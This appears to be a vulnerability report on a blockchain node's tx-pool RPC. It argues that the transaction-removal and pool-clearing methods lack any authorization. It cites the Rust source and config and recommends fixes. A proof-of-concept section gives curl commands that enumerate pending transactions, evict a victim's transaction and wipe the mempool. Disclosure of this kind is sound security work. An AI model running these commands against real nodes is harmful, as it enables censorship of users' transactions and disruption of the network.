### Title
Unauthenticated `remove_transaction` RPC Allows Any Caller to Evict Any User's Pending Transaction — (`File: rpc/src/module/pool.rs`)

### Summary

The `remove_transaction` RPC method in the Pool module accepts only a `tx_hash` parameter and removes the matching transaction (and all its dependents) from the tx-pool with no check that the caller has any relationship to the transaction. Any caller who can reach the RPC endpoint can silently evict any other user's pending transaction. The root cause is structurally identical to the reported `burn` vulnerability: a destructive operation on another party's resource is gated only by knowledge of an identifier, not by ownership or authorization.

### Finding Description

`PoolRpcImpl::remove_transaction` in `rpc/src/module/pool.rs` is implemented as:

```rust
fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
        error!("Send remove_tx request error {}", e);
        RPCError::ckb_internal_error(e)
    })
}
``` [1](#0-0) 

The function takes only `tx_hash: H256` and immediately forwards it to `TxPoolController::remove_local_tx`. There is no check that the caller submitted the transaction, owns any of its input cells, or holds any credential. The entire call chain — `remove_transaction` → `remove_local_tx` → `Message::RemoveLocalTx` → `service.remove_tx(tx_hash)` — carries no caller identity at any layer. [2](#0-1) 

The RPC server itself has no authentication middleware. `server.rs` builds a plain axum router with `CorsLayer::permissive()` and no auth layer: [3](#0-2) 

The Pool module — which contains `remove_transaction`, `clear_tx_pool`, and `clear_tx_verify_queue` — is enabled by default in the shipped `ckb.toml`: [4](#0-3) 

`clear_tx_pool` and `clear_tx_verify_queue` share the same absence of authorization and are even more destructive (wiping the entire pool): [5](#0-4) 

### Impact Explanation

Any caller who can reach the RPC endpoint can:

1. Call `get_raw_tx_pool` to enumerate all pending transaction hashes.
2. Call `remove_transaction` with any hash to silently evict that transaction and all its descendants from the pool.
3. Repeat continuously to prevent a targeted user's transactions from ever being confirmed — a sustained, targeted transaction-censorship attack.
4. Call `clear_tx_pool` to wipe the entire mempool in a single request, disrupting all pending users simultaneously.

For time-sensitive operations (DAO withdrawals, time-locked transfers, RBF replacements), sustained eviction can cause real financial harm even though the underlying cells are not destroyed. The victim must continuously resubmit and pay fees while the attacker pays nothing.

### Likelihood Explanation

The RPC binds to `127.0.0.1:8114` by default, which limits exposure to local processes. However:

- Many production deployments (dApp backends, wallets, exchanges, public RPC gateways) deliberately expose the RPC to external networks. The documentation acknowledges this is a common pattern while warning against it — it is a supported, not unsupported, configuration.
- The Pool module is enabled by default with no per-method access control; operators enabling the Pool module for `send_transaction` unknowingly also expose `remove_transaction` and `clear_tx_pool` to every caller.
- tx hashes are public (visible via `get_raw_tx_pool`), so no secret knowledge is required.

### Recommendation

Add caller-identity authorization to destructive Pool RPC methods. Options in increasing strength:

1. **Separate the module**: Move `remove_transaction`, `clear_tx_pool`, and `clear_tx_verify_queue` into a distinct `PoolAdmin` module that operators can enable independently from the read/write Pool module.
2. **Token-based auth**: Require a node-operator-configured secret token (e.g., HTTP `Authorization` header) for any state-mutating Pool RPC call.
3. **Ownership check**: For `remove_transaction`, verify that at least one input cell of the transaction is locked by a script whose args match a caller-supplied proof, analogous to requiring `msg.sender == account` in the Solidity fix.

### Proof of Concept

Attacker-controlled entry path (no privileges required beyond RPC reachability):

```bash
# Step 1: enumerate the pool
curl -s http://<node>:8114 -X POST -H 'Content-Type: application/json' \
  -d '{"id":1,"jsonrpc":"2.0","method":"get_raw_tx_pool","params":[false]}'
# Returns: {"result":{"pending":["0xabc...victim_tx_hash..."],...}}

# Step 2: evict victim's transaction — no credential needed
curl -s http://<node>:8114 -X POST -H 'Content-Type: application/json' \
  -d '{"id":2,"jsonrpc":"2.0","method":"remove_transaction","params":["0xabc...victim_tx_hash..."]}'
# Returns: {"result":true}

# Step 3 (escalation): wipe the entire pool
curl -s http://<node>:8114 -X POST -H 'Content-Type: application/json' \
  -d '{"id":3,"jsonrpc":"2.0","method":"clear_tx_pool","params":[]}'
# Returns: {"result":null}
```

The victim's transaction is gone from the pool. The victim must resubmit; the attacker can loop step 2 indefinitely at zero cost.

### Citations

**File:** rpc/src/module/pool.rs (L662-669)
```rust
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
        let tx_pool = self.shared.tx_pool_controller();

        tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
            error!("Send remove_tx request error {}", e);
            RPCError::ckb_internal_error(e)
        })
    }
```

**File:** rpc/src/module/pool.rs (L684-701)
```rust
    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }

    fn clear_tx_verify_queue(&self) -> Result<()> {
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_verify_queue()
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```

**File:** tx-pool/src/service.rs (L826-834)
```rust
        Message::RemoveLocalTx(Request {
            responder,
            arguments: tx_hash,
        }) => {
            let result = service.remove_tx(tx_hash).await;
            if let Err(e) = responder.send(result) {
                error!("Responder sending remove_tx result failed {:?}", e);
            };
        }
```

**File:** rpc/src/server.rs (L119-129)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** resource/ckb.toml (L190-193)
```text
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"] # {{
# dev => modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Terminal"]
# integration => modules = ["Net", "Pool", "Miner", "Chain", "Experiment", "Stats", "IntegrationTest", "Terminal"]
# }}
```
